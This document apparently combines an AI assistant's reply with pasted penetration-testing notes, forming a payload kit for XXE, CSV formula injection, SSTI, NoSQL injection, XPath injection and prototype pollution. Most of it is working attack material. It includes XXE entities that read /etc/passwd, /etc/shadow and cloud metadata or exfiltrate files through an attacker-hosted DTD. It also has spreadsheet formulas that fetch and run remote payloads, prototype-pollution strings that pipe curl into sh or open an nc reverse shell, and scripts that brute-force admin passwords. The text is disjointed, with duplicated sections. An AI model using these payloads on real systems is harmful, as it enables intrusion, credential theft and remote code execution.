Absolutely, Anvesh — here's a **modular XXE test suite** tailored for your GitHub methodology, with additional edge cases and automation-ready payloads. Each test includes expected behavior and signs of vulnerability.

---

## 🧬 XML External Entity (XXE) Injection Test Suite

### 1. Basic External Entity Injection  
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

✅ Expected: External entities disabled  
❌ Vulnerable: File contents returned

---

### 2. Blind XXE via Out-of-Band DNS  
```xml
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://yourdomain.burpcollaborator.net"> %xxe; ]>
<stockCheck><productId>123</productId></stockCheck>
```

✅ Expected: No DNS resolution  
❌ Vulnerable: DNS ping received

---

### 3. SSRF via Metadata Service  
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

✅ Expected: Internal IPs blocked  
❌ Vulnerable: Metadata returned

---

### 4. Base64 File Read via PHP Filter  
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
<data>&xxe;</data>
```

✅ Expected: Filter blocked  
❌ Vulnerable: Encoded file contents returned

---

### 5. Parameter Entity for Blind XXE  
```xml
<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "http://yourdomain.com"> %xxe; ]>
<stockCheck><productId>3</productId></stockCheck>
```

✅ Expected: Parameter entities disabled  
❌ Vulnerable: OOB interaction triggered

---

### 6. Billion Laughs DoS  
```xml
<!DOCTYPE lolz [
  <!ENTITY a0 "LOL">
  <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
  <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
  <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
]>
<data>&a3;</data>
```

✅ Expected: Entity expansion limits enforced  
❌ Vulnerable: Parser crash or hang

---

### 7. XInclude Injection  
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

✅ Expected: XInclude disabled  
❌ Vulnerable: File contents included

---

### 8. Directory Listing via Entity  
```xml
<!DOCTYPE root [ <!ENTITY xxe SYSTEM "file:///etc/"> ]>
<root><foo>&xxe;</foo></root>
```

✅ Expected: Directory access blocked  
❌ Vulnerable: Directory contents listed

---

### 9. XXE Inside DOCX/SVG  
Embed payloads in file formats that use XML internally.

✅ Expected: Secure parsing of embedded XML  
❌ Vulnerable: XXE triggered via file upload

# **1. List of Vulnerabilities (XXE Attack Surface)**

* **1.1 Classic External Entity Injection**
  Loading external files via `<!ENTITY>`.

* **1.2 File Disclosure via XXE**
  Reading sensitive files such as `/etc/passwd`.

* **1.3 SSRF via XXE**
  Using XML parsers to send requests to internal services.

* **1.4 Blind XXE (Out-of-Band)**
  Exfiltrating data using DNS/HTTP callbacks.

* **1.5 Parameter Entity Expansion**
  Parser loads external entities inside attributes.

* **1.6 Billion Laughs (DoS)**
  Recursive entities causing memory exhaustion.

* **1.7 Schema / DTD Injection**
  Attacker injects malicious internal DTD references.

* **1.8 External DTD Fetching Bypass**
  With custom URIs, multi-encoding, or specially crafted payloads.

* **1.9 SVG, SOAP, DOCX, PDF XXE**
  XXE through XML-based file formats.

* **1.10 XXE → RCE (rare, chained)**
  When XML parser interacts with command-executing libraries.

---

# **2. Sample Payloads (Core Attack Payloads)**

(Simple, safe-to-read examples)

### **2.1 Basic XXE – File Read**

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

### **2.2 SSRF via XXE**

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:80/">
]>
<root>&xxe;</root>
```

### **2.3 Blind XXE (DNS/HTTP Ping)**

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://abc.your-callback-domain.com/">
]>
<data>&xxe;</data>
```

### **2.4 Billion Laughs (DoS Example)**

```xml
<!DOCTYPE lolz [
 <!ENTITY a "123">
 <!ENTITY b "&a;&a;">
 <!ENTITY c "&b;&b;">
]>
<data>&c;</data>
```

---

# **3. Bypass Payloads (Advanced Techniques)**

Used when the application blocks DTD or external entities.

### **3.1 Base64 Encoded File Read**

```xml
<!DOCTYPE foo [
  <!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
  <!ENTITY xxe "%data;">
]>
<root>&xxe;</root>
```

### **3.2 Parameter Entity Bypass**

```xml
<!DOCTYPE foo [
  <!ENTITY % p1 SYSTEM "file:///etc/passwd">
  <!ENTITY p2 "%p1;">
]>
<root>%p2;</root>
```

### **3.3 XXE in SOAP Envelope**

```xml
<?xml version="1.0"?>
<!DOCTYPE a [
  <!ENTITY xxe SYSTEM "file:///etc/shadow">
]>
<soap:Envelope>
  <data>&xxe;</data>
</soap:Envelope>
```

### **3.4 External DTD Bypass**

Hosted malicious DTD:

```xml
<!DOCTYPE foo SYSTEM "http://attacker.com/malicious.dtd">
<root>test</root>
```

`malicious.dtd`:

```xml
<!ENTITY % xxe SYSTEM "file:///etc/passwd">
<!ENTITY data "%xxe;">
```

### **3.5 Encoding Bypass**

```xml
<!DOCTYPE %25foo [
  <!ENTITY %25xxe SYSTEM "file:///etc/passwd">
]>
```

### **3.6 Numeric IP SSRF**

```
http://2130706433        (127.0.0.1 in decimal)
```

### **3.7 SVG File XXE**

```xml
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg>&xxe;</svg>
```

---

# **4. Updated With Realistic Testing Payloads (Advanced Learning)**

### **4.1 Real File Disclosure Payload**

```xml
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "/etc/hostname">
]>
<root>&xxe;</root>
```

### **4.2 AWS Metadata Access**

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/">
]>
<root>&xxe;</root>
```

### **4.3 GitHub Enterprise (SSRF)**

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://localhost:8080/api/v3/admin">
]>
<data>&xxe;</data>
```

### **4.4 Blind XXE with Burp Collaborator**

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://x.your-collab.net">
]>
<ping>&xxe;</ping>
```

### **4.5 DOCX / PPTX XXE (word/document.xml)**

```xml
<!DOCTYPE r [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<w:p>&xxe;</w:p>
```

### **4.6 PDF XXE (XMP Section)**

```xml
<!DOCTYPE x [
  <!ENTITY xxe SYSTEM "file:///etc/hosts">
]>
<metadata>&xxe;</metadata>
```

---

# **5. Validation / Test Steps**

**Step 1:** Identify any XML-processing endpoint
→ SOAP, SAML, SVG upload, RSS feeds, XML APIs, PDF/DOCX processors.

**Step 2:** Send basic XXE — check for file content.
→ `/etc/passwd`, `/etc/hostname`.

**Step 3:** Attempt SSRF XXE
→ `127.0.0.1`, `169.254.169.254`.

**Step 4:** Try blind XXE / OOB
→ DNS/HTTP callbacks.

**Step 5:** Try bypass payloads
→ parameter entities, encoded DTD, external DTD hosting.

---

# **6. Expected Results / Impact**

* Sensitive file disclosure.
* SSRF into internal systems.
* Cloud metadata credentials leakage.
* Application crash due to DoS.
* Potential **RCE** when chained with unsafe parsers or libraries.
---

### 10. Content-Type Mismatch  
Send XML with incorrect `Content-Type`.

```http
POST /api/xml
Content-Type: application/json

<?xml version="1.0"?><foo>&xxe;</foo>
```

✅ Expected: Parser rejects mismatched content  
❌ Vulnerable: XML parsed despite header

To systematically identify and fuzz **XXE injection points**, it's crucial to understand both **where** and **how** XML content is handled across the application. Here's a structured breakdown of **common parameters** and **fuzzing criteria** tailored for XXE hunting:

---

## 🧩 Common Parameters to Fuzz (One-Liner Format)

> xml, request, data, body, content, payload, input, message, soap, envelope, file, filepath, filename, doc, document, resource, template, config, metadata, settings, schema, definition, DTD, markup, parser, render, type, feed, submission, upload, import, include, attachment

## 🧪 Fuzzing Criteria for XXE Vulnerability

Each parameter should be tested under one or more of the following conditions:

### 📦 **1. Payload Accepted in XML Format**
- Does the parameter support or accept XML-formatted input?
- Try submitting:
  ```xml
  <root>&test;</root>
  ```
  and observe parsing behavior.

---

### 📥 **2. External Entities Are Parsed**
- Inject `<!DOCTYPE>` declaration with `SYSTEM`, `PUBLIC`, or `ENTITY` tags.
- Validate via file read (`file:///etc/passwd`) or SSRF (`http://domain/xxe`).

---

### 🌐 **3. Out-of-Band (Blind XXE) Behavior**
- Monitor for DNS/HTTP callbacks triggered by payload like:
  ```xml
  <!ENTITY xxe SYSTEM "http://collaborator.net/ping">
  ```

---

### 🧾 **4. Content-Type Enforcement**
- Send XML payload with various content types:
  - `application/xml`
  - `text/xml`
  - `application/json` (to test mismatch parsing)

---

### 📎 **5. Embedded File References**
- Check if parameters accept paths or file references.
  - Example: `file`, `template`, `doc`, `import`
- Try entities like:
  ```xml
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
  ```

---

### 🔗 **6. Header-Based Reflection**
- Inspect headers:
  - `SOAPAction`, `X-XML-Content`, `Content-Disposition`
- Inject malformed XML via POST body or headers.

---

### 🎯 **7. Format-Specific XML Parsing**
- Submit XML inside structured formats like DOCX, SVG, or XSL.
- Upload files with embedded XXE payloads.

---

# CSV Injection (Formula Injection)

## Overview
CSV Injection, also known as Formula Injection, occurs when an application allows users to export data into an Excel file (CSV format) that contains malicious formulas. When the exported file is opened in spreadsheet software, the formulas can execute arbitrary commands on the system.

## Steps to Test for CSV Injection
1. Select any parameter that is part of the Excel sheet to be downloaded.
2. Modify values in these fields to insert malicious formulas (e.g., First Name, Last Name, Amount, Title, Status, etc.).
3. Download the Excel file and open it.
4. If the injected formula executes (e.g., launches the calculator), the application is vulnerable.

> **Mistake:** Do not upload the Excel file back into the application for verification. This results in a false negative.
```
=
+
–
@
```

## Example Payloads
### Pop Calculator
```csv
DDE ("cmd";"/C calc";"!A0")A0
@SUM(1+1)*cmd|' /C calc'!A0
=2+5+cmd|' /C calc'!A0
```

### Pop Notepad
```csv
=cmd|' /C notepad'!'A1'
```

### PowerShell Download and Execute
```csv
=cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0
```

### Metasploit SMB Delivery with rundll32
```csv
=cmd|'/c rundll32.exe \\10.0.0.1\3\2\1.dll,0'!_xlbgnm.A1
```

## Technical Details
- `cmd` is the command-line interpreter that the formula can invoke.
- `/C calc` specifies the command to execute (`calc.exe` in this case).
- `!A0` or similar references indicate where the formula should be placed in the spreadsheet.

### Google Sheets

Google Sheets allows some additionnal formulas that are able to fetch remote URLs:

* [IMPORTXML](https://support.google.com/docs/answer/3093342?hl=en)(url, xpath_query, locale)
* [IMPORTRANGE](https://support.google.com/docs/answer/3093340)(spreadsheet_url, range_string)
* [IMPORTHTML](https://support.google.com/docs/answer/3093339)(url, query, index)
* [IMPORTFEED](https://support.google.com/docs/answer/3093337)(url, [query], [headers], [num_items])
* [IMPORTDATA](https://support.google.com/docs/answer/3093335)(url)

So one can test blind formula injection or a potential for data exfiltration with:

```c
=IMPORTXML("http://burp.collaborator.net/csv", "//a/@href")
```

## Mitigation
To prevent CSV injection:
- Prefix user input with a single quote (`'`) to treat it as text.
- Validate and sanitize user input before exporting.
- Restrict export functionality if formula execution poses a security risk.

---
# Server-Side Template Injection (SSTI)

Server-Side Template Injection (SSTI) can occur when an application allows users to modify templates, such as:

- **Email Templates**
- **Suspension Notices**
- **Invoices**

If the application processes user input as part of a template rendering engine, SSTI might be possible.

## Steps to Identify SSTI

1. **Edit a Template**  
   - Locate a feature where templates are editable (e.g., email body, invoice format).

2. **Identify Vulnerable Parameters**  
   - Check for fields where user input is dynamically processed (e.g., columns, placeholders).

3. **Insert Malicious Payload**  
   - Test with payloads like:
     ```jinja
     {{ 7*7 }}  <!-- Checks for Jinja2 -->
     ${7*7}     <!-- Checks for JSP/Thymeleaf -->
     <% 7*7 %>  <!-- Checks for PHP/Velocity -->
     ```
   - For critical exploitation, try:
     ```jinja
     {% extends "/etc/passwd" %}
     ```

4. **Save, Preview, or Download the Output**  
   - If the server executes the injected template and returns system information, it's vulnerable.

## Mitigation Strategies

- **Use Safe Template Engines**  
  - Avoid using engines that allow direct execution of user input.
  
- **Implement Input Validation & Escaping**  
  - Ensure user input is sanitized before rendering.

- **Disable Dangerous Functions**  
  - Restrict access to filesystem and system functions in template rendering.

---

# NoSQL Injection

> NoSQL databases provide looser consistency restrictions than traditional SQL databases. By requiring fewer relational constraints and consistency checks, NoSQL databases often offer performance and scaling benefits. Yet these databases are still potentially vulnerable to injection attacks, even if they aren't using the traditional SQL syntax.

## Summary

* [Tools](#tools)
* [Methodology](#methodology)
    * [Operator Injection](#operator-injection)
    * [Authentication Bypass](#authentication-bypass)
    * [Extract Length Information](#extract-length-information)
    * [Extract Data Information](#extract-data-information)
    * [WAF and Filters](#waf-and-filters)
* [Blind NoSQL](#blind-nosql)
    * [POST with JSON Body](#post-with-json-body)
    * [POST with urlencoded Body](#post-with-urlencoded-body)
    * [GET](#get)
* [Labs](#references)
* [References](#references)

## Tools

* [codingo/NoSQLmap](https://github.com/codingo/NoSQLMap) - Automated NoSQL database enumeration and web application exploitation tool
* [digininja/nosqlilab](https://github.com/digininja/nosqlilab) - A lab for playing with NoSQL Injection
* [matrix/Burp-NoSQLiScanner](https://github.com/matrix/Burp-NoSQLiScanner) - This extension provides a way to discover NoSQL injection vulnerabilities.

## Methodology

NoSQL injection occurs when an attacker manipulates queries by injecting malicious input into a NoSQL database query. Unlike SQL injection, NoSQL injection often exploits JSON-based queries and operators like `$ne`, `$gt`, `$regex`, or `$where` in MongoDB.

### Operator Injection

| Operator | Description        |
| -------- | ------------------ |
| $ne      | not equal          |
| $regex   | regular expression |
| $gt      | greater than       |
| $lt      | lower than         |
| $nin     | not in             |

Example: A web application has a product search feature

```js
db.products.find({ "price": userInput })
```

An attacker can inject a NoSQL query: `{ "$gt": 0 }`.

```js
db.products.find({ "price": { "$gt": 0 } })
```
# ✅ **NoSQL Injection – Complete Test Case (with Bypass Cases)**

### **1.1 Boolean-Based NoSQL Injection**

Injecting `$ne`, `$gt`, `$exists` etc. to force conditions to always evaluate to true.

### **1.2 Query Operator Injection**

Manipulating backend JSON queries using `$ne`, `$in`, `$regex`, `$eq`, `$or`, `$and`, etc.

### **1.3 Authentication Bypass**

Bypassing login by injecting operators so password validation is skipped.

### **1.4 Regex-Based Injection**

Using wildcard regex like `.*` or `^` to match any username or password.

### **1.5 Blind NoSQL Injection**

Observing response/time differences to extract data without direct output.

### **1.6 Projection Manipulation**

Injecting projection modifiers to expose hidden fields or bypass restrictions.

### **1.7 $where JavaScript Injection (MongoDB)**

Injecting JavaScript expressions when `$where` is enabled in backend queries.

### **1.8 Array-Based Injection**

Sending arrays instead of strings to break query logic or force unintended matches.

### **1.9 Type Confusion Injection**

Exploiting loosely typed fields (string vs number vs boolean) to bypass conditions.

### **1.10 Privilege Escalation via Filter Tampering**

Manipulating role or access filters to escalate privileges.

---

# **2. Sample Payloads (Test Inputs)**

Below are safe, defensive sample payloads showing where injection can occur.

---

### **2.1 Basic Operator Injection**

```
username=admin&password[$ne]=null
```

```
{ "username": { "$ne": null }, "password": { "$ne": null } }
```

---

### **2.2 Authentication Bypass Payloads**

```
username=admin&password[$gt]=0
```

```
password[$exists]=true
```

---

### **2.3 Regex Injection**

```
username=admin&password[$regex]=.*
```

```
password[$regex]=^a
```

---

### **2.4 Blind Injection Payloads**

```
username=admin&password[$regex]=^(?=.{1,}).*
```

Timing-based:

```
$where=sleep(5000)
```

---

### **2.5 $where JavaScript Injection**

```
{"$where": "this.password.length > 0"}
```

```
{"$where": "function() { return true; }"}
```

---

### **2.6 Array-Based Injection**

```
username[]=admin
```

```
password[]=123
```

---

### **2.7 Type Confusion Payloads**

```
username=true
```

```
password=0
```

---

### **2.8 Privilege Escalation Payloads**

```
role[$ne]=user
```

```
{"role": {"$in": ["admin", "superuser"]}}
```

---

# **3. Bypass Techniques (Advanced)**

These mimic real-world bypass approaches used against weak NoSQL filters.

---

### **3.1 Operator Obfuscation Bypass**

```
password[%24ne]=null
```

```
password[$n%e]=null
```

---

### **3.2 JSON Structure Manipulation**

```
{ "username": "admin", "$or": [ {}, { "password": { "$ne": "test" } } ] }
```

---

### **3.3 Array Injection Bypass**

```
username=admin&password[$in][]=anything
```

---

### **3.4 Encoded Injection**

URL-encoded:

```
password%5B%24ne%5D=null
```

Double-encoded:

```
password%255B%2524ne%255D=null
```

---

### **3.5 Regex Bypass Variants**

```
password[$regex]=.*
password[$regex]=^.*
password[$regex]=(?s).*
password[$regex]=.{0,100}
```

---

### **3.6 JavaScript Bypass (MongoDB)**

```
$where=1==1
```

```
$where=function(){return(true);}
```

---

### **3.7 Numeric/String Type Abuse**

```
"role": 1
```

```
"role": "1"
```

Backend may treat numbers as admin flags.

---

### **3.8 Boolean-Type Bypass**

```
"username": true
```

```
"password": false
```

---

### **3.9 Logical Injection ($or / $and)**

```
{ "$or": [ { "username": "admin" }, { "username": { "$ne": null } } ] }
```

```
{ "$and": [ { "role": "user" }, { "role": { "$ne": "user" } } ] }
```

---

### **3.10 Null Injection**

```
{ "username": null }
```

Sometimes matches everything due to weak matching.

---

# **4. Combined Master Payload (All-In-One Fuzzer)**

Single payload for broad test coverage.

```
username=admin
password[$ne]=null
password[$regex]=.*
role[$in][]=admin
$where=function(){return true;}
```

Instead of returning a specific product, the database returns all products with a price greater than zero, leaking data.

### Authentication Bypass

Basic authentication bypass using not equal (`$ne`) or greater (`$gt`)

* HTTP data

  ```ps1
  username[$ne]=toto&password[$ne]=toto
  login[$regex]=a.*&pass[$ne]=lol
  login[$gt]=admin&login[$lt]=test&pass[$ne]=1
  login[$nin][]=admin&login[$nin][]=test&pass[$ne]=toto
  ```

* JSON data

  ```json
  {"username": {"$ne": null}, "password": {"$ne": null}}
  {"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}
  {"username": {"$gt": undefined}, "password": {"$gt": undefined}}
  {"username": {"$gt":""}, "password": {"$gt":""}}
  ```

### Extract Length Information

Inject a payload using the $regex operator. The injection will work when the length is correct.

```ps1
username[$ne]=toto&password[$regex]=.{1}
username[$ne]=toto&password[$regex]=.{3}
```

### Extract Data Information

Extract data with "`$regex`" query operator.

* HTTP data

  ```ps1
  username[$ne]=toto&password[$regex]=m.{2}
  username[$ne]=toto&password[$regex]=md.{1}
  username[$ne]=toto&password[$regex]=mdp

  username[$ne]=toto&password[$regex]=m.*
  username[$ne]=toto&password[$regex]=md.*
  ```

* JSON data

  ```json
  {"username": {"$eq": "admin"}, "password": {"$regex": "^m" }}
  {"username": {"$eq": "admin"}, "password": {"$regex": "^md" }}
  {"username": {"$eq": "admin"}, "password": {"$regex": "^mdp" }}
  ```

Extract data with "`$in`" query operator.

```json
{"username":{"$in":["Admin", "4dm1n", "admin", "root", "administrator"]},"password":{"$gt":""}}
```

### WAF and Filters

**Remove pre-condition**:

In MongoDB, if a document contains duplicate keys, only the last occurrence of the key will take precedence.

```js
{"id":"10", "id":"100"} 
```

In this case, the final value of "id" will be "100".

## Blind NoSQL

### POST with JSON Body

Python script:

```python
import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

username="admin"
password=""
u="http://example.org/login"
headers={'content-type': 'application/json'}

while True:
    for c in string.printable:
        if c not in ['*','+','.','?','|']:
            payload='{"username": {"$eq": "%s"}, "password": {"$regex": "^%s" }}' % (username, password + c)
            r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)
            if 'OK' in r.text or r.status_code == 302:
                print("Found one more char : %s" % (password+c))
                password += c
```

### POST with urlencoded Body

Python script:

```python
import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

username="admin"
password=""
u="http://example.org/login"
headers={'content-type': 'application/x-www-form-urlencoded'}

while True:
    for c in string.printable:
        if c not in ['*','+','.','?','|','&','$']:
            payload='user=%s&pass[$regex]=^%s&remember=on' % (username, password + c)
            r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)
            if r.status_code == 302 and r.headers['Location'] == '/dashboard':
                print("Found one more char : %s" % (password+c))
                password += c
```

### GET

Python script:

```python
import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

username='admin'
password=''
u='http://example.org/login'

while True:
  for c in string.printable:
    if c not in ['*','+','.','?','|', '#', '&', '$']:
      payload=f"?username={username}&password[$regex]=^{password + c}"
      r = requests.get(u + payload)
      if 'Yeah' in r.text:
        print(f"Found one more char : {password+c}")
        password += c
```

Ruby script:

```ruby
require 'httpx'

username = 'admin'
password = ''
url = 'http://example.org/login'
# CHARSET = (?!..?~).to_a # all ASCII printable characters
CHARSET = [*'0'..'9',*'a'..'z','-'] # alphanumeric + '-'
GET_EXCLUDE = ['*','+','.','?','|', '#', '&', '$']
session = HTTPX.plugin(:persistent)

while true
  CHARSET.each do |c|
    unless GET_EXCLUDE.include?(c)
      payload = "?username=#{username}&password[$regex]=^#{password + c}"
      res = session.get(url + payload)
      if res.body.to_s.match?('Yeah')
        puts "Found one more char : #{password + c}"
        password += c
      end
    end
  end
end
```
---------
# XPath Injection

XPath Injection is an attack technique used to exploit applications that construct XPath (XML Path Language) queries from user-supplied input to query or navigate XML documents. Similar to SQL Injection, this attack can manipulate XPath queries to gain unauthorized access to data.

## Common Payloads
```xpath
' or '1'='1
' or ''=''
x' or 1=1 or 'x'='y
/
//
//*
*/*
@*
count(/child::node())
x' or name()='username' or 'x'='y
' and count(/*)=1 and '1'='1
' and count(/@*)=1 and '1'='1
' and count(/comment())=1 and '1'='1
search=')] | //user/*[contains(*,'
search=Har') and contains(../password,'c
search=Har') and starts-with(../password,'c
```

## Tools
- **xcat** - Automate XPath injection attacks to retrieve documents
- **xxxpwn** - Advanced XPath Injection Tool
- **xxxpwn_smart** - A fork of xxxpwn using predictive text
- **xpath-blind-explorer**
- **XmlChor** - XPath injection exploitation tool

### Related Resources
[PayloadsAllTheThings - XPath Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XPATH%20Injection)

---

## Bug Bounty Videos
1. **Extracting Password from Browser Memory Dump** using Task Manager and WinHex
2. **Cookie Poisoning Demonstration**
3. **XSS with HTTP Response Splitting**
4. **JSON Attack - How to Find and Exploit JSON Vulnerabilities**

# XML External Entity (XXE) Attack

An **XML External Entity (XXE) attack** is a type of attack against an application that parses XML input and allows XML entities. XML entities can be used to tell the XML parser to fetch specific content on the server.

## Types of Entities

### Internal Entity  
If an entity is declared within a DTD, it is called an **internal entity**.  
**Syntax:**  
```xml
<!ENTITY entity_name "entity_value">
```

### External Entity  
If an entity is declared outside a DTD, it is called an **external entity** and is identified by `SYSTEM`.  
**Syntax:**  
```xml
<!ENTITY entity_name SYSTEM "entity_value">
```

## Exploiting XXE

Setting the `Content-Type: application/xml` in the request when sending an XML payload to the server can be helpful in exploitation.

### Example: Reading `/etc/passwd`
```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY test SYSTEM 'file:///etc/passwd'>
]>
<root>&test;</root>
```

Another example:
```xml
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ELEMENT data (#ANY)>
  <!ENTITY file SYSTEM "file:///etc/passwd">
]>
<data>&file;</data>
```
## Vulnerabilities

XXE vulnerabilities often exist in **XML-RPC implementations** and other XML-based data processing systems.

```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example "Doe"> ]>
 <userInfo>
  <firstName>John</firstName>
  <lastName>&example;</lastName>
 </userInfo>
```

```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example "Doe"> ]>
 <userInfo>
  <firstName>John</firstName>
  <lastName>&example;</lastName>
 </userInfo>
```
### XXE OOB Attack (Yunusov, 2013).
### XXE OOB Attack (Yunusov, 2013)
```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE data SYSTEM "http://publicServer.com/parameterEntity_oob.dtd">
<data>&send;</data>
```
### File stored on http://publicServer.com/parameterEntity_oob.dtd
```
<!ENTITY % file SYSTEM "file:///sys/power/image_size">
<!ENTITY % all "<!ENTITY send SYSTEM 'http://publicServer.com/?%file;'>">
%all;
```
### XXE PHP Wrapper
```
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<contacts>
  <contact>
    <name>Jean &xxe; Dupont</name>
    <phone>00 11 22 33 44</phone>
    <adress>42 rue du CTF</adress>
    <zipcode>75000</zipcode>
    <city>Paris</city>
  </contact>
</contacts>
```
🔹 **Tools for Testing**: 
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection
```
🔹 **Mitigation**: Disable external entity processing in XML parsers or use libraries with built-in protection against XXE.  
🔹 **Tools for Testing**: Burp Suite, OWASP ZAP, and `xxe.py` can help in identifying XXE vulnerabilities.

### Classic XXE B64 Encoded
<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>

```
Classic XXE - etc passwd
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data (#ANY)>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<data>&file;</data>
```
```

# Prototype Pollution

> Prototype pollution is a type of vulnerability that occurs in JavaScript when properties of Object.prototype are modified. This is particularly risky because JavaScript objects are dynamic and we can add properties to them at any time. Also, almost all objects in JavaScript inherit from Object.prototype, making it a potential attack vector.

Here’s a curated list of **fuzzable parameters** and input sinks commonly involved in **Prototype Pollution**, tailored for pentesting workflows like yours:

# **✅ Prototype Pollution Attack – Complete Test Case (with Bypass Cases)**

# **1. List of Vulnerabilities**

1.1 Object Prototype Pollution

1.2 Constructor Prototype Pollution

1.3 Polluting Deep Nested Objects

1.4 DOM Prototype Pollution (Client-Side)

1.5 Server-Side Prototype Pollution (Node.js)

1.6 Bypass Shallow Key Filters

1.7 Polluting JSON Merge / Patch Endpoint

1.8 Pollution via Query Parameters

1.9 Escaping Input Sanitization

1.10 Advanced Payload Chains (Privilege Escalation / RCE)

# **2. Sample Payloads (Core Attack Payloads)**

*(Normal Structured Payloads)*

```
2.1 Basic Prototype Pollution
{"__proto__":{"polluted":true}}
```

```
2.2 Constructor Prototype Pollution
{"constructor":{"prototype":{"admin":true}}}
```

```
2.3 Deep Nested Pollution
{"a":{"b":{"__proto__":{"isAdmin":1}}}}
```

```
2.4 Pollute Global Object.prototype
{"prototype":{"debug":"enabled"}}
```

```
2.5 Function Constructor Pollution
{"constructor":{"prototype":{"exploit":"yes"}}}
```

```
2.6 Array Prototype Pollution
{"__proto__":{"0":"malicious","length":9999}}
```

```
2.7 Query Parameter Pollution
?__proto__[admin]=true
```

```
2.8 JSON Patch Pollution
{"op":"add","path":"/__proto__/pwn","value":"x"}
```

```
2.9 Express.js Body Parser Pollution
?a[__proto__][admin]=1
```

```
2.10 Server Config Pollution
{"__proto__":{"cacheTTL":0}}
```

---

# **3. Sample Payloads (Updated With Real Offensive Payloads)**

*(Offensive prototype pollution payloads used for real attack chains)*

```
3.1 Node.js Command Execution Chain
{"__proto__":{"shell":"/bin/bash -c 'curl http://x/p.sh|sh'"}}
```

```
3.2 Privilege Escalation (User → Admin)
{"constructor":{"prototype":{"role":"admin"}}}
```

```
3.3 JWT Auth Bypass
{"__proto__":{"algorithms":["none"],"ignoreExpiration":true}}
```

```
3.4 Rate Limit Bypass
{"__proto__":{"rateLimit":0}}
```

```
3.5 DOM XSS via innerHTML Pollution
{"__proto__":{"innerHTML":"<img src=x onerror=alert(1)>"}}
```

```
3.6 Pollute Object.assign() Defaults
{"__proto__":{"overwrite":true}}
```

```
3.7 Path Traversal → File Write Exploit
{"__proto__":{"recursive":true}}
```

```
3.8 Disable Security Sanitizers
{"__proto__":{"sanitizeFilter":false}}
```

```
3.9 Password Policy Bypass
{"__proto__":{"minPasswordLength":1}}
```

```
3.10 CSRF Protection Disable
{"__proto__":{"csrfEnabled":false}}
```

---

# **4. Bypass Techniques (Filters, Sanitizers, WAF Evasion)**

*(Same style as Host Header / GraphQL bypass cases)*

```
4.1 Unicode Bypass
{"\u005f\u005fproto\u005f\u005f":{"admin":1}}
```

```
4.2 Double-Encoded Key Bypass
%5F%5Fproto%5F%5F[admin]=1
```

```
4.3 Mixed Case Bypass
{"__ProTo__":{"polluted":"yes"}}
```

```
4.4 Deep Nesting to Evade Shallow Filters
{"x":{"y":{"z":{"__proto__":{"pwn":"x"}}}}}
```

```
4.5 Array Injection Bypass
[{"__proto__":{"admin":true}}]
```

```
4.6 Dot-Notation Bypass
?__proto__.role=admin
```

```
4.7 Bracket-Notation Bypass
?__proto__[role]=admin
```

```
4.8 Encoded JSON Patch Bypass
{"op":"add","path":"\/__proto__\/\u0061","value":"pwn"}
```

```
4.9 Nested Constructor Override
{"a":{"constructor":{"prototype":{"hacked":1}}}}
```

```
4.10 Polluting via CSP-Bypass (Client-Side)
?__proto__[nonce]=fakeNonce
```

---

# **5. Advanced Attack Chains**

*(Prototype Pollution → XSS / RCE / Auth Bypass)*

```
5.1 Prototype Pollution → DOM XSS
?__proto__[innerHTML]=<img src=x onerror=alert(1337)>
```

```
5.2 Prototype Pollution → JWT "None" Bypass
{"__proto__":{"algorithms":["none"]}}
```

```
5.3 Prototype Pollution → Node RCE
{"__proto__":{"shell":"/bin/sh -c 'nc attacker 4444 -e /bin/sh'"}}
```

```
5.4 Prototype Pollution → NoSQL Injection
{"__proto__":{"sanitizeFilter":false}}
```

```
